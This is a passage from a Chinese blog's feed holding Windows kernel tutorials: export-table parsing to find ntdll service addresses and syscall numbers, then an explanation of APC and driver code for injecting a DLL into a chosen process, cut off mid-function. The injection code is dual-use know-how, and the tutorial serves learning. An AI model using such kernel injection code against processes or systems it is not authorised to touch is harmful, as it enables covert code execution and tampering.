(IMAGE_DOS_HEADER*)v1;</span><br><span class="line">        ImageOptionalHeader32 = (IMAGE_OPTIONAL_HEADER32*)((UINT8*)v1 + ImageDosHeader-&gt;e_lfanew + <span class="number">24</span>);</span><br><span class="line">        ImageExportDirectory = (IMAGE_EXPORT_DIRECTORY*)((UINT8*)v1 + ImageOptionalHeader32-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);</span><br><span class="line">        AddressOfFunctions = (ULONG*)((UINT8*)v1 + ImageExportDirectory-&gt;AddressOfFunctions);</span><br><span class="line">        AddressOfNames = (ULONG*)((UINT8*)v1 + ImageExportDirectory-&gt;AddressOfNames);</span><br><span class="line">        AddressOfNameOrdinals = (USHORT*)((UINT8*)v1 + ImageExportDirectory-&gt;AddressOfNameOrdinals);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ImageExportDirectory-&gt;NumberOfFunctions; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            ServiceName = (<span class="type">char</span>*)((UINT8*)v1 + AddressOfNames[i]);</span><br><span class="line"></span><br><span class="line">            Ordinals = AddressOfNameOrdinals[i];</span><br><span class="line">            ServiceAddress = (ULONG)((UINT8*)v1 + AddressOfFunctions[Ordinals]);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; NT_DLL_INFOS; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (__NtdllInfos[j].ServiceAddress == <span class="literal">NULL</span> &amp;&amp; __NtdllInfos[j].ServiceName != <span class="literal">NULL</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (_stricmp(ServiceName, __NtdllInfos[j].ServiceName) == <span class="number">0</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        __NtdllInfos[j].ServiceAddress = (PVOID)ServiceAddress;</span><br><span class="line">                        k++;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (k &gt;= NumberOfServices)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    __except (EXCEPTION_EXECUTE_HANDLER)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不是WIN10_VERSION_10240版本，区别在于需要加上base-1得到Ordinals。上面直接用AddressOfNameOrdinals就行</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">AddressOfNameOrdinals = (USHORT*)((UINT8*)v1 + ImageExportDirectory-&gt;AddressOfNameOrdinals);</span><br><span class="line">Base = ImageExportDirectory-&gt;Base;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ImageExportDirectory-&gt;NumberOfFunctions; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            ServiceName = (<span class="type">char</span>*)((UINT8*)v1 + AddressOfNames[i]);</span><br><span class="line"></span><br><span class="line">            Ordinals = AddressOfNameOrdinals[i] + Base - <span class="number">1</span>;</span><br><span class="line">            ServiceAddress = (ULONG)((UINT8*)v1 + AddressOfFunctions[Ordinals]);</span><br><span class="line">            ......</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">GetNtServiceAddressInternal2</span><span class="params">(ULONG NumberOfServices)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PVOID v1 = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    IMAGE_DOS_HEADER* ImageDosHeader;</span><br><span class="line">    IMAGE_OPTIONAL_HEADER32* ImageOptionalHeader32;</span><br><span class="line">    IMAGE_EXPORT_DIRECTORY* ImageExportDirectory;</span><br><span class="line"></span><br><span class="line">    ULONG* AddressOfFunctions;</span><br><span class="line">    ULONG* AddressOfNames;</span><br><span class="line">    USHORT* AddressOfNameOrdinals;</span><br><span class="line"></span><br><span class="line">    ULONG Ordinals;</span><br><span class="line">    ULONG Base, i, ServiceAddress;</span><br><span class="line">    <span class="type">char</span>* ServiceName;</span><br><span class="line"></span><br><span class="line">    ULONG j = <span class="number">0</span>;</span><br><span class="line">    ULONG k = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">        v1 = __NtdllImageBase;</span><br><span class="line">        <span class="keyword">if</span> (v1 == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        ImageDosHeader = (IMAGE_DOS_HEADER*)v1;</span><br><span class="line">        ImageOptionalHeader32 = (IMAGE_OPTIONAL_HEADER32*)((UINT8*)v1 + ImageDosHeader-&gt;e_lfanew + <span class="number">24</span>);</span><br><span class="line">        ImageExportDirectory = (IMAGE_EXPORT_DIRECTORY*)((UINT8*)v1 + ImageOptionalHeader32-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);</span><br><span class="line">        AddressOfFunctions = (ULONG*)((UINT8*)v1 + ImageExportDirectory-&gt;AddressOfFunctions);</span><br><span class="line">        AddressOfNames = (ULONG*)((UINT8*)v1 + ImageExportDirectory-&gt;AddressOfNames);</span><br><span class="line">        AddressOfNameOrdinals = (USHORT*)((UINT8*)v1 + ImageExportDirectory-&gt;AddressOfNameOrdinals);</span><br><span class="line"></span><br><span class="line">        Base = ImageExportDirectory-&gt;Base;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ImageExportDirectory-&gt;NumberOfFunctions; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            ServiceName = (<span class="type">char</span>*)((UINT8*)v1 + AddressOfNames[i]);</span><br><span class="line"></span><br><span class="line">            Ordinals = AddressOfNameOrdinals[i] + Base - <span class="number">1</span>;</span><br><span class="line">            ServiceAddress = (ULONG)((UINT8*)v1 + AddressOfFunctions[Ordinals]);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; NT_DLL_INFOS; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (__NtdllInfos[j].ServiceAddress == <span class="literal">NULL</span> &amp;&amp; __NtdllInfos[j].ServiceName != <span class="literal">NULL</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (_stricmp(ServiceName, __NtdllInfos[j].ServiceName) == <span class="number">0</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        __NtdllInfos[j].ServiceAddress = (PVOID)ServiceAddress;</span><br><span class="line">                        k++;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (k &gt;= NumberOfServices)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    __except (EXCEPTION_EXECUTE_HANDLER)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Ntos服务号、函数地址"><a href="#Ntos服务号、函数地址" class="headerlink" title="Ntos服务号、函数地址"></a>Ntos服务号、函数地址</h2><p><strong>用函数名的Unicode调MmGetSystemRoutineAddress获取函数地址</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ULONG __NtReadVirtualMemoryServiceIdentity = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> NTKERNELAPI <span class="title">BOOLEAN</span><span class="params">(*PFN_PSGETPROCESSEXITPROCESSCALLED)</span><span class="params">(PEPROCESS EProcess)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitializeNtosKernel</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    UNICODE_STRING v1;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__NtReadVirtualMemoryServiceIdentity == <span class="number">0</span>)</span><br><span class="line">        __NtReadVirtualMemoryServiceIdentity = <span class="built_in">GetNtServiceIdentity</span>((PVOID)__NtdllInfos[ZW_READ_VIRTUAL_MEMORY].ServiceAddress);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">RtlInitUnicodeString</span>(&amp;v1, <span class="string">L&quot;PsGetProcessExitProcessCalled&quot;</span>);</span><br><span class="line">    __PsGetProcessExitProcessCalled = (PFN_PSGETPROCESSEXITPROCESSCALLED)<span class="built_in">MmGetSystemRoutineAddress</span>(&amp;v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>地址转服务号</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ULONG <span class="title">GetNtServiceIdentity</span><span class="params">(PVOID ServiceAddress)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PUCHAR v1;</span><br><span class="line">    ULONG ServiceIdentity;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ServiceAddress == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v1 = (PUCHAR)ServiceAddress;</span><br><span class="line">    <span class="keyword">if</span> (*v1 != (UCHAR)<span class="number">0xB8</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ServiceIdentity = *(PULONG)(v1 + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">IS_VALID_ID</span>(ServiceIdentity))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ServiceIdentity;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;获取Ntdll常用服务信息和Ntos服务信息&quot;&gt;&lt;a href=&quot;#获取Ntdll常用服务信息和Ntos服务信息&quot; class=&quot;headerlink&quot; title=&quot;获取Ntdll常用服务信息和Ntos服务信息&quot;&gt;&lt;/a&gt;获取Ntdll常用服务信息和Ntos服务</summary>
      
    
    
    
    <category term="Windows Kernel" scheme="https://qianmuoy.github.io/categories/Windows-Kernel/"/>
    
    
  </entry>
  
  <entry>
    <title>APC注入</title>
    <link href="https://qianmuoy.github.io/2024/03/09/APC%E6%B3%A8%E5%85%A5/"/>
    <id>https://qianmuoy.github.io/2024/03/09/APC%E6%B3%A8%E5%85%A5/</id>
    <published>2024-03-09T12:40:40.000Z</published>
    <updated>2024-03-09T12:40:55.406Z</updated>
    
    <content type="html"><![CDATA[<h1 id="APC注入"><a href="#APC注入" class="headerlink" title="APC注入"></a>APC注入</h1><h2 id="APC机制"><a href="#APC机制" class="headerlink" title="APC机制"></a>APC机制</h2><p>线程是不能被杀死 挂起和恢复的，线程在执行的时候自己占据着CPU，别人怎么可能控制他呢？举个极端的例子，如果不调用API，屏蔽中断，并保证代码不出现异常，线程将永久占据CPU。所以说线程如果想结束，一定是自己执行代码把自己杀死，不存在别人把线程结束的情况。</p><p>那如果想改变一个线程的行为该怎么办？可以给他提供一个函数，让他自己去调用，这个函数就是APC，即异步过程调用</p><p><img src="/.io//image-20240304230529013.png" alt="image-20240304230529013"></p><p>对于内核APC，APC函数的插入和执行并不是同一个线程，具体点说：在A线程中向B线程插入一个APC，插入的动作是在A线程中完成的，但什么时候执行则由B线程决定。所以叫异步过程调用。</p><p><strong>线程切换</strong>时，在<code>SwapContext</code>函数即将执行完成的时候，会判断当前是否有要执行的内核APC，接着将判断的结果存到eax，然后返回，接着找到上一层函数<code>KiSwapContext</code>函数，这个函数也没有对APC进行处理，而是继续返回，到父函数，会判断<code>KiSwapContext</code>的返回值，也就是判断当前是否有要处理的内核APC，如果有，则调用<code>KiDeliverApc</code>进行处理。</p><p><strong>系统调用</strong>中断或者异常(<code>_KiServiceExit</code>)，会判断是否有要执行的用户APC，如果有的话则会调用<code>KiDeliverApc</code>函数进行处理，此时<code>KiDeliverApc</code>第一个参数为1，代表执行用户APC和内核APC。当要执行用户APC之前，先要执行内核APC。</p><p>对于应用APC，当产生系统调用、中断或者异常，线程在返回用户空间前都会调用<code>_KiServiceExit</code>函数，在<code>_KiServiceExit</code>函数里会判断是否有要执行的用户APC，如果有则调用<code>KiDeliverApc</code>函数进行处理。</p><p>有用户APC要执行的话，就意味着线程要<strong>提前</strong>返回到用户空间去执行，而且返回的位置不是线程进入内核时的位置，而是返回到真正执行APC的位置每处理一个用户APC就会涉及到：<strong>内核—&gt;用户空间—&gt;再回到内核空间</strong>。进入内核前，当前上下文会被临时保存以待恢复。</p><h2 id="APC注入-1"><a href="#APC注入-1" class="headerlink" title="APC注入"></a>APC注入</h2><h3 id="dllmain"><a href="#dllmain" class="headerlink" title="dllmain"></a>dllmain</h3><p>注入的dll弹一个messageBox就行：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function"> )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(<span class="literal">NULL</span>, <span class="string">L&quot;Inject&quot;</span>, <span class="string">L&quot;Success&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="KAPC"><a href="#KAPC" class="headerlink" title="KAPC"></a>KAPC</h3><p>创建好设备对象和链接对象，设计派遣历程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegisterPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">UNREFERENCED_PARAMETER</span>(RegisterPath);</span><br><span class="line">NTSTATUS Status = STATUS_SUCCESS;</span><br><span class="line">PDEVICE_OBJECT  DeviceObject = <span class="literal">NULL</span>;</span><br><span class="line">UNICODE_STRING  DeviceObjectName;</span><br><span class="line">UNICODE_STRING  DeviceLinkName;</span><br><span class="line">ULONGi;</span><br><span class="line">DriverObject-&gt;DriverUnload = DriverUnload;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建设备对象名称</span></span><br><span class="line"><span class="built_in">RtlInitUnicodeString</span>(&amp;DeviceObjectName, DEVICE_OBJECT_NAME);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建设备对象</span></span><br><span class="line">Status = <span class="built_in">IoCreateDevice</span>(DriverObject, <span class="literal">NULL</span>,</span><br><span class="line">&amp;DeviceObjectName,</span><br><span class="line">FILE_DEVICE_UNKNOWN,</span><br><span class="line"><span class="number">0</span>, FALSE,</span><br><span class="line">&amp;DeviceObject);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建设备连接名称</span></span><br><span class="line"><span class="built_in">RtlInitUnicodeString</span>(&amp;DeviceLinkName, DEVICE_LINK_NAME);</span><br><span class="line"><span class="comment">//将设备连接名称与设备名称关联 </span></span><br><span class="line">Status = <span class="built_in">IoCreateSymbolicLink</span>(&amp;DeviceLinkName, &amp;DeviceObjectName);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">IoDeleteDevice</span>(DeviceObject);</span><br><span class="line"><span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//设计符合我们代码的派遣历程</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; IRP_MJ_MAXIMUM_FUNCTION; i++)</span><br><span class="line">&#123;</span><br><span class="line">DriverObject-&gt;MajorFunction[i] = PassThroughDispatch;   <span class="comment">//函数指针</span></span><br><span class="line">&#125;</span><br><span class="line">DriverObject-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = ControlThroughDispatch;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="派遣例程"><a href="#派遣例程" class="headerlink" title="派遣例程"></a>派遣例程</h4><p>默认直接通过</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">PassThroughDispatch</span><span class="params">(PDEVICE_OBJECT  DeviceObject, PIRP Irp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Irp-&gt;IoStatus.Status = STATUS_SUCCESS;     <span class="comment">//LastError()</span></span><br><span class="line">Irp-&gt;IoStatus.Information = <span class="number">0</span>;             <span class="comment">//ReturnLength </span></span><br><span class="line"><span class="built_in">IoCompleteRequest</span>(Irp, IO_NO_INCREMENT);   <span class="comment">//将Irp返回给Io管理器</span></span><br><span class="line"><span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>IRP_MJ_DEVICE_CONTROL自定义</p><p>解析IRP堆栈内容，筛选IO控制码，CTL_APC_INJECTION就调用注入函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">ControlThroughDispatch</span><span class="params">(PDEVICE_OBJECT  DeviceObject, PIRP Irp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">NTSTATUS Status;</span><br><span class="line">ULONG_PTR Informaiton = <span class="number">0</span>;</span><br><span class="line">PVOID InputData = <span class="literal">NULL</span>;</span><br><span class="line">ULONG InputDataLength = <span class="number">0</span>;</span><br><span class="line">PVOID OutputData = <span class="literal">NULL</span>;</span><br><span class="line">ULONG OutputDataLength = <span class="number">0</span>;</span><br><span class="line">ULONG IoControlCode = <span class="number">0</span>;</span><br><span class="line">PEPROCESS EProcess = <span class="literal">NULL</span>;</span><br><span class="line">PIO_STACK_LOCATION  IoStackLocation = <span class="built_in">IoGetCurrentIrpStackLocation</span>(Irp);  <span class="comment">//Irp堆栈</span></span><br><span class="line">    </span><br><span class="line">IoControlCode = IoStackLocation-&gt;Parameters.DeviceIoControl.IoControlCode;</span><br><span class="line">InputData = Irp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">OutputData = Irp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">InputDataLength = IoStackLocation-&gt;Parameters.DeviceIoControl.InputBufferLength;</span><br><span class="line">OutputDataLength = IoStackLocation-&gt;Parameters.DeviceIoControl.OutputBufferLength;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">switch</span> (IoControlCode)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> CTL_APC_INJECTION:</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (InputDataLength &gt;= <span class="built_in">sizeof</span>(INJECTION_INFORMATION) &amp;&amp; InputData)</span><br><span class="line">Status = <span class="built_in">ApcInjectionPrepare</span>((PINJECTION_INFORMATION)InputData);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">Status = STATUS_INFO_LENGTH_MISMATCH;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">Irp-&gt;IoStatus.Status = Status;            <span class="comment">//Ring3 GetLastError();</span></span><br><span class="line">Irp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">IoCompleteRequest</span>(Irp, IO_NO_INCREMENT);  <span class="comment">//将Irp返回给Io管理器</span></span><br><span class="line"><span class="keyword">return</span> Status;                            <span class="comment">//Ring3 DeviceIoControl()返回值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="APC注入主函数"><a href="#APC注入主函数" class="headerlink" title="APC注入主函数"></a>APC注入主函数</h4><ol><li>PsLookupProcessByProcessId通过目标进程ID获取EProcess</li><li>PsGetProcessWow64Process返回值可以判断是不是Wow64进程。</li><li>KeWaitForSingleObject返回值判断是否是僵尸进程。如果是，解引用释放。</li><li>KeStackAttachProcess切换进程上下背景文。</li><li>自己实现的SeGetModuleBaseByModuleName从目标进程获取Ntdll模块基地址。这里会使用到是否是Wow64进程</li><li>自己实现的SeGetExportFunctionFromModule从目标模块获取LdrLoadDll导出函数。</li><li>初始化ShellCode</li><li>调用自己的ApcInjection开始进行注入。</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">ApcInjectionPrepare</span><span class="params">(IN PINJECTION_INFORMATION InjectionInfo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">NTSTATUS Status = STATUS_SUCCESS;</span><br><span class="line">NTSTATUS ThreadStatus = STATUS_SUCCESS;</span><br><span class="line">PEPROCESS EProcess = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">Status = <span class="built_in">PsLookupProcessByProcessId</span>((HANDLE)InjectionInfo-&gt;TargetProcessID, &amp;EProcess);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">&#123;</span><br><span class="line">KAPC_STATE Apc;</span><br><span class="line">UNICODE_STRING DllFullPath,NtdllFullPath;</span><br><span class="line"><span 